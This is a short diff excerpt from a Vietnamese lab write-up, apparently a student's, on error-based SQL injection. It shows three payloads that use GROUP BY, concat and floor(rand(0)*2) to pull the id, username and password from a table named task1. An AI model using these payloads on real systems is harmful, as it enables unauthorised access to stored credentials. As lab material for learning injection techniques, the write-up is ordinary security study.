@@ -83,7 +83,9 @@ Bằng cách như trên, em cũng tìm ra được tên các cột trong bảng.
 Vậy bảng `task1` có 3 cột lần lượt là: `id`, `username`, `password`.
 Bây giờ, để lấy dữ liệu từ bảng, em truyền payload như sau:
 **Payload lấy id:**`' or 1=1 group by concat((select id from task1 limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `
+
 **Payload lấy username:**`' or 1=1 group by concat((select username from task1 limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `
+
 **Payload lấy password:**`' or 1=1 group by concat((select password from task1 limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `
 ![](https://i.imgur.com/IFG4Swc.png)
 
